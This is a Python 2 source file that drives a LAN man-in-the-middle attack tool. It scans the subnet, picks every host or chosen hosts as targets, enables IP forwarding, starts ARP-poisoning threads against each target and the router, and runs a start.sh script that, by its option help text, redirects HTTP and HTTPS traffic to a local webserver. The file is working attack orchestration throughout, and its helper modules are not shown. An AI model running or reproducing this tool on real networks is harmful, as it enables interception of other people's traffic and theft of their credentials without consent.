#from arpPoisoning import *
import arpPoisoning
from ipScanner import IpScanner
from subprocess import Popen
from os import geteuid
from time import sleep
import argparse
import netifaces
import subprocess
import sys


def main():
    #argument parsing
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interactive", help= "manually choose targets", action="store_true")
    parser.add_argument("-m", "--myIp", help="Manually specify your IP if not able to automatically get it")
    parser.add_argument("-n", "--netiface", help="Specify the interface to use by default wlan0", default="wlan0")
    parser.add_argument("-r", "--routerIP", help="Specify default IP for the router if not able to automatically find it")
    parser.add_argument("-x", "--ignoreHttp", help= "Don't redirect paquet from port 80 to the local webserver", action="store_true")
    parser.add_argument("-y", "--ignoreHttps", help= "Don't redirect paquet from port 443 to the local webserver", action="store_true")

    args = parser.parse_args()

    myNetiface = args.netiface
    if geteuid() != 0:
        sys.exit("[!] Please run as root")

    interactive = args.interactive
    if args.myIp == None:
        #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #s.connect(("8.8.8.8", 80))
        #myIp = s.getsockname()[0]
        myIp = netifaces.ifaddresses(myNetiface)[netifaces.AF_INET][0]["addr"]
    else:
        myIp = args.myIp
    print "Your IP is: ", myIp


    if(args.routerIP == None):
        routerIP = netifaces.gateways()["default"][netifaces.AF_INET][0]
    else:
        routerIP = args.routerIP
    print "Router IP is: ", routerIP

    try:
        scanRange = routerIP[0:routerIP.rindex(".")]
    except ValueError:
        scanRange = "192.168.0"

    scanner = IpScanner(scanRange)
    targetlist = scanner.scan()

    try:
        targetlist.remove(routerIP)
    except:
        pass
    try:
        targetlist.remove(myIp)
    except:
        pass

    attacklist = []

    #who to target?
    if interactive:
        while True:
            if targetlist == []:
                print 'Target list empty'
                break

            print 'Get the os for the specified IP addresse, write "next" to go to next step.'
            print 'Chose an IP:'
            print targetlist
            ip = raw_input()
            if ip.lower() == 'next':
                break
            else:
                attackOS = scanner.getOsForIp(ip)
                print attackOS

            print 'Do you want to add this to the attack list? (y/n)'
            answer = raw_input()
            if answer.lower() == 'y' or answer.lower() =='yes':
                attacklist.append(ip)
                targetlist.remove(ip)

    else:
        attacklist = targetlist
        #interaction avec usager pour les targets

    print attacklist
    print "######",args.ignoreHttp
    print "*****",args.ignoreHttps
    use80 = "0" if args.ignoreHttp else "1"
    use443 = "0" if args.ignoreHttps else "1"

    subprocess.call(["./start.sh", myIp, myNetiface, use80, use443])

    print 'To stop the attack you must press <ENTER>.'
    initIpFwd()
    threadList = []

    for i in attacklist:
        t = arpPoisoning.ArpPoisoning(routerIP, i)
        print "Starting thread: ",t.getName()
        t.start()
        threadList.append(t)


    while True:
        answer = raw_input()
        if answer.lower() == '':
            break
        sleep(1)

    arpPoisoning.exitFlag = 1
    for t in threadList:
        print "Stopping: ", t.getName()
        t.join()
    restoreIpFwd()

    subprocess.call(["./reset.sh"])


def initIpFwd():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('1\n')


def restoreIpFwd():
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        ipf.write('0\n')


if __name__ == "__main__":
    main()